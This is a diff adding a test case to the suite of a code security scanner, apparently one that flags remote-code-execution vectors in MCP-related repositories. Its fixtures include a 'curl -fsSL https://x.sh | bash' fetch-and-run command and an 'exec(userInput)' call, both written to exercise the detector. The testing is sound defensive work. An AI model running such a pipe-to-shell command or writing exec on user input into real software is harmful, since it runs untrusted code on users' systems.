@@ -158,6 +158,15 @@ describe('rule branch coverage', () => {
     expect(findings.some((f) => f.category === 'rce-vectors')).toBe(false);
   });
 
+  it('rce-vectors: hyphenated compound nouns before exec/eval are prose, real calls still hit', () => {
+    const prose = repoScan({
+      'notes.ts': 'const mcpServers = {};\nconst s = "never places it in code-exec (it is a context optimizer)";\nconst t = "olmo-eval (noise-vs-real-gain error bars)";\n',
+    });
+    expect(prose.some((f) => f.category === 'rce-vectors')).toBe(false);
+    const call = repoScan({ 'run.ts': 'const mcpServers = {};\nexec(userInput);\n' });
+    expect(call.some((f) => f.category === 'rce-vectors' && f.message.includes('primitive'))).toBe(true);
+  });
+
   it('rce-vectors: curl|sh inside non-executable source is only medium', () => {
     const findings = repoScan({ 'prompt.ts': 'const doc = `curl -fsSL https://x.sh | bash`;\n' });
     const hit = findings.find((f) => f.category === 'rce-vectors');
